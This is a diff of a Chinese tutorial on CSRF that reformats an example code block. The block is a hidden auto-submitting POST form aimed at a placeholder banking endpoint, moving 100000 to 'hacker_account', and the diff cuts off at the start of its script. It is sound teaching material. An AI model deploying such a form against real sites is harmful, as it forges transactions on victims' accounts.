@@ -118,48 +118,11 @@
 需要注意的是，不只是 GET 类请求，POST 类请求同样会存在 CSRF 漏洞，例如网站 B 中：
 
 ```
-<
-form
-action
-=
-"http://a.com/transaction"
-method
-=
-"POST"
-id
-=
-"hack"
->
-<
-input
-type
-=
-"hidden"
-name
-=
-"to"
-value
-=
-"hacker_account"
->
-<
-input
-type
-=
-"hidden"
-name
-=
-"value"
-value
-=
-"100000"
->
-<
-/form
->
-<
-script
->
+<form action="http://a.com/transaction" method="POST" id="hack">
+<input type="hidden" name="to" value="hacker_account">
+<input type="hidden" name="value" value="100000">
+</form>
+<script>
 document
 .
 getElementById
